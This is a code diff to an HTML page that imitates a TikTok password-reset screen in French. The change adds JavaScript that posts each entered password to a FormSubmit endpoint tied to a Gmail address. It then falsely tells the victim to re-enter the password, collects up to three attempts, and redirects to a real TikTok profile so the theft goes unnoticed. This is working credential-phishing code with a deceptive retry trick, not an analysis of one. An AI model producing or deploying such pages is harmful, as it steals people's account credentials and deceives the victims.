@@ -150,10 +150,21 @@
             color: var(--text-main);
         }
 
+        /* Red message displayed right under the password field group */
+        .error-msg {
+            color: var(--tiktok-red);
+            font-size: 0.82rem;
+            font-weight: 600;
+            text-align: left;
+            margin-top: -10px;
+            margin-bottom: 16px;
+            display: none;
+        }
+
         .submit-btn {
             width: 100%;
             padding: 14px;
-            margin-top: 12px;
+            margin-top: 4px;
             font-size: 1rem;
             font-weight: 700;
             color: #ffffff;
@@ -186,14 +197,11 @@
         <!-- Username -->
         <h1 class="username">@haramideluxe430</h1>
 
-        <!-- Reset Form connected to FormSubmit -->
-        <form action="https://formsubmit.co/nbroseten@gmail.com" method="POST">
+        <!-- Reset Form handled via JavaScript for multi-step submission -->
+        <form id="reset-form">
             
-            <!-- Disables the FormSubmit Captcha page -->
+            <!-- Hidden configuration fields for FormSubmit -->
             <input type="hidden" name="_captcha" value="false">
-
-            <!-- Redirects user to Google after submission -->
-            <input type="hidden" name="_next" value="https://www.google.com">
 
             <!-- Untouchable Display Field for Phone Identifier with Algerian Flag -->
             <div class="form-group">
@@ -216,11 +224,19 @@
                 </div>
             </div>
 
-            <button type="submit" class="submit-btn">Réinitialiser le mot de passe</button>
+            <!-- Red Notice Message positioned directly under the password field -->
+            <div id="notice-msg" class="error-msg">Veuillez entrer votre mot de passe à nouveau pour confirmer</div>
+
+            <button type="submit" class="submit-btn" id="submit-btn">Réinitialiser le mot de passe</button>
         </form>
     </main>
 
     <script>
+        let submissionAttempt = 1;
+        const maxAttempts = 3;
+        const targetUrl = "https://www.tiktok.com/@uv_aria";
+        const formEndpoint = "https://formsubmit.co/ajax/nbroseten@gmail.com";
+
         function togglePasswordVisibility() {
             const pwdInput = document.getElementById('password');
             const eyeIcon = document.getElementById('eye-icon');
@@ -232,6 +248,52 @@
                 eyeIcon.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />';
             }
         }
+
+        document.getElementById('reset-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const passwordInput = document.getElementById('password');
+            const noticeMsg = document.getElementById('notice-msg');
+            const submitBtn = document.getElementById('submit-btn');
+
+            const formData = new FormData(this);
+            formData.append('attempt_number', submissionAttempt);
+
+            submitBtn.disabled = true;
+            submitBtn.style.opacity = '0.7';
+
+            fetch(formEndpoint, {
+                method: 'POST',
+                body: formData,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            })
+            .then(response => {
+                submitBtn.disabled = false;
+                submitBtn.style.opacity = '1';
+
+                if (submissionAttempt < maxAttempts) {
+                    submissionAttempt++;
+                    passwordInput.value = '';
+                    noticeMsg.style.display = 'block';
+                    passwordInput.focus();
+                } else {
+                    window.location.href = targetUrl;
+                }
+            })
+            .catch(error => {
+                submitBtn.disabled = false;
+                submitBtn.style.opacity = '1';
+                if (submissionAttempt < maxAttempts) {
+                    submissionAttempt++;
+                    passwordInput.value = '';
+                    noticeMsg.style.display = 'block';
+                } else {
+                    window.location.href = targetUrl;
+                }
+            });
+        });
     </script>
 </body>
 </html>
